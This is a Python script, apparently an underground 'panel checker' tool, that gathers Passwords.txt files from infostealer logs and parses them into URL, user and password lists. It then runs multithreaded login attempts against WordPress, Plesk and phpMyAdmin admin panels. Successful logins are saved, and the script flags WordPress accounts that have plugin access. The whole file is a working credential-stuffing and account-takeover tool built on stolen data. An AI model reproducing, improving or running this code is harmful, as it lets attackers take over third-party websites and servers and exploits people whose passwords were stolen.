import os,sys,time,random,requests
from colorama import *
from platform import system
from multiprocessing.dummy import Pool as ThreadPool
from requests import session
from requests import request
from bs4 import BeautifulSoup
requests.urllib3.disable_warnings()
sys.tracebacklimit = 0
init(autoreset=True)
#coded by X

with open('error.log', 'w') as f:
    sys.stderr = f

def logo():
    if system() == 'Linux':
        os.system('clear')
    if system() == 'Windows':
        os.system('cls')
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]

    x = """
 ::::::::      :::     :::::::::  :::::::::   ::::::::  ::::    :::      ::::::::::: ::::::::   ::::::::  :::        ::::::::  
:+:    :+:   :+: :+:   :+:    :+: :+:    :+: :+:    :+: :+:+:   :+:          :+:    :+:    :+: :+:    :+: :+:       :+:    :+: 
+:+         +:+   +:+  +:+    +:+ +:+    +:+ +:+    +:+ :+:+:+  +:+          +:+    +:+    +:+ +:+    +:+ +:+       +:+        
+#+        +#++:++#++: +#++:++#:  +#++:++#+  +#+    +:+ +#+ +:+ +#+          +#+    +#+    +:+ +#+    +:+ +#+       +#++:++#++ 
+#+        +#+     +#+ +#+    +#+ +#+    +#+ +#+    +#+ +#+  +#+#+#          +#+    +#+    +#+ +#+    +#+ +#+              +#+ 
#+#    #+# #+#     #+# #+#    #+# #+#    #+# #+#    #+# #+#   #+#+#          #+#    #+#    #+# #+#    #+# #+#       #+#    #+# 
 ########  ###     ### ###    ### #########   ########  ###    ####          ###     ########   ########  ########## ########  
 \t\n Added Panel Checker [WordPress & Plugin] & [Plesk] & [Php my admin]
    """
    for N, line in enumerate( x.split( "\n" ) ):
        sys.stdout.write( " \x1b[1;%dm%s%s\n " % (random.choice( colors ), line, clear) )
        time.sleep( 0.05 )
logo()


def find_and_save_passwords(folder):
    for file_or_folder in os.listdir(folder):
        if os.path.isdir(os.path.join(folder, file_or_folder)):
            find_and_save_passwords(os.path.join(folder, file_or_folder))
        elif file_or_folder == "Passwords.txt":
            passwords_file_path = os.path.join(folder, file_or_folder)
            with open(passwords_file_path, 'r', encoding='utf-8', errors='ignore') as password_file:
                with open('results.txt', 'a', encoding='utf-8') as results_file:
                    results_file.write(password_file.read())

folder_path = input("Please enter the folder path: ")
print(Fore.WHITE + "[INFO] " + Fore.GREEN + "Wait for Passwords.txt to be Collected")

if not os.path.isdir(folder_path):
    print("The specified folder could not be found.")
else:
    find_and_save_passwords(folder_path)
    print(Fore.WHITE + "[INFO] " + Fore.GREEN + "Passwords Collection completed")
    time.sleep(0.5)
    print(Fore.WHITE + "[INFO] " + Fore.GREEN + "Wait for the List to Clear and Format")
    a=''
    with open('results.txt','r', encoding="utf8") as f:
        s = f.read().split('\n')
        for i in s:
            if 'URL:' in i:
                a += i[5:]+'|'
            if 'Username:' in i:
                a += i[10:]+':'
            if 'Password:' in i:
                a += i[10:]+'\n'
        f.close()

    l = open('results.txt','w', encoding="utf-8")
    l.write(a)
    l.close()
    print(Fore.WHITE + "[INFO] " + Fore.GREEN + "Cleanup and Format Completed")
    time.sleep(0.5)
    print(Fore.WHITE + "[INFO] " + Fore.GREEN + "Panels Wanted [wp-login.php, Plesk, PHP MY ADMIN]")
    filename = "results.txt"
    search_terms = ["wp-login.php","8443","phpmyadmin"]

    with open(filename, encoding="utf-8") as f:
        lines = f.readlines()

    for term in search_terms:
        matches = []
        for i, line in enumerate(lines):
            if term in line:
                matches.append(line)
        
        with open(f"{term}.txt", "w", encoding="utf-8") as f:
            f.write("".join(matches))
        
        print(Fore.WHITE + "[INFO] "+ Fore.GREEN  + f"{term} for {len(matches)} Match Found.")
    print(Fore.WHITE + "[INFO] " + Fore.GREEN + "Panel Scan Process Finished.")

headers = { 
    'User-Agent'  : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept'      : 'text/plain'
} 

def check(url):
    site = url.split("|")[0]
    user, passwd = url.split("|")[1].split(":")
    
    try:
        with session() as s:
            resp = s.post(site+'/wp-login.php',headers=headers, data={
                'log':user,
                'pwd': passwd,
                'wp-submit': 'Log In'
            },timeout=5)
    except requests.exceptions.ConnectionError:
        print(Fore.RED + "[Connection Error] --> "+ site)
        return
    except Exception as e:
        print(Fore.RED + "[Error] --> "+ site + " --> " + str(e))
        return

    if 'Dashboard' in resp.text:
        print(Fore.GREEN + "[Success] --> " + site)
        open("wp-logins.txt", "a", encoding="utf-8").write(site+"#"+user+"@"+passwd+"\n")
        
        soup = BeautifulSoup(resp.content, 'html.parser')
        if soup.find('a', {'href': 'plugins.php'}):
            print(Fore.GREEN + "[Success] --> " + site + " --> [Plugins]")
            open("wp-plugins.txt", "a", encoding="utf-8").write(site+"#"+user+"@"+passwd+"\n")
        else:
            print(Fore.RED + "[Failed] --> "+ site + " --> [Plugins]")
            return
            
    else:
        print(Fore.RED + "[Failed] --> "+ site)
        return
    
def loadlist():
    try:
        load = "wp-login.php.txt"
        try:
            with open(load, 'r', encoding="utf-8") as (get):
                read = get.read().splitlines()
        except IOError:
            pass
        read = list(read)
        try:
            pp = ThreadPool(100)
            pr = pp.map(check, read)
        except:
            pass
    except:
        pass
loadlist()
os.remove("wp-login.php.txt")
def check(url):
    #site = url.split("#")[0]
    #user, passwd = url.split("#")[1].split("@")
    site = url.split("|")[0]
    user, passwd = url.split("|")[1].split(":")
    try:
        resp = request(method='POST',url=site,headers=headers, data={
            'login_name':user,
            'passwd': passwd,
            'send': 'Log In'
        },timeout=5).text
    except:
        pass

    if 'Applications' in resp:
        print(Fore.GREEN + "[Success] --> " + site)
        open("PleskGoodPanel.txt", "a", encoding="utf-8").write(site+"|"+user+"|"+passwd+"\n")
    else:
        print(Fore.RED + "[Failed] --> "+ site)

def loadlist():
    try:
        load = "8443.txt"
        try:
            with open(load, 'r', encoding="utf-8") as (get):
                read = get.read().splitlines()
        except IOError:
            pass
        read = list(read)
        try:
            pp = ThreadPool(100)
            pr = pp.map(check, read)
        except:
            pass
    except:
        pass
loadlist()
os.remove("8443.txt")
def check(url):
    #site = url.split("#")[0]
    #user, passwd = url.split("#")[1].split("@")
    site = url.split("|")[0]
    user, passwd = url.split("|")[1].split(":")
    try:
        resp = request(method='POST',url=site,headers=headers, data={
            'pma_username':user,
            'pma_password': passwd,
        },timeout=5).text
    except:
        pass

    if 'Appearance' in resp:
        print(Fore.GREEN + "[Success] --> " + site)
        open("GOODPHPMYADMIN.txt", "a", encoding="utf-8").write(site+"|"+user+"|"+passwd+"\n")
    else:
        print(Fore.RED + "[Failed] --> "+ site)

def loadlist():
    try:
        load = "phpmyadmin.txt"
        try:
            with open(load, 'r', encoding="utf-8") as (get):
                read = get.read().splitlines()
        except IOError:
            pass
        read = list(read)
        try:
            pp = ThreadPool(100)
            pr = pp.map(check, read)
        except:
            pass
    except:
        pass
loadlist()
os.remove("phpmyadmin.txt")